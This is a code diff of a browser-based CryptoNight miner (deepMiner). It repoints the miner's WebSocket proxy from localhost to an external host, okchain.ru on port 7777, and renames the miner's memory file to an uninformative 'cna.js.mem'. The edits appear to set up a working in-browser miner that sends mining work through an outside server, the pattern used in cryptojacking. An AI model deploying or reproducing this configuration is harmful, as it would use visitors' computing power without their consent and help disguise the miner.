@@ -1,14 +1,14 @@
 self.deepMiner = self.deepMiner || {};
 self.deepMiner.CONFIG = {
-    LIB_URL: "https://localhost/lib/",
-    WEBSOCKET_SHARDS: [["wss://localhost:7777/proxy"]]
+    LIB_URL: "http://localhost/lib/",
+    WEBSOCKET_SHARDS: [["ws://okchain.ru:7777/proxy"]]
 };
 var Module = {
     locateFile: (function (path) {
         return deepMiner.CONFIG.LIB_URL + path
     })
 };
-var Module;
+//var Module;
 if (!Module) Module = (typeof Module !== "undefined" ? Module : null) || {};
 var moduleOverrides = {};
 for (var key in Module) {
@@ -1132,7 +1132,7 @@ var ASM_CONSTS = [];
 STATIC_BASE = Runtime.GLOBAL_BASE;
 STATICTOP = STATIC_BASE + 11504;
 __ATINIT__.push();
-memoryInitializer = "cryptonight-asmjs.min.js.mem";
+memoryInitializer = "cna.js.mem";
 var tempDoublePtr = STATICTOP;
 STATICTOP += 16;
 var PROCINFO = {
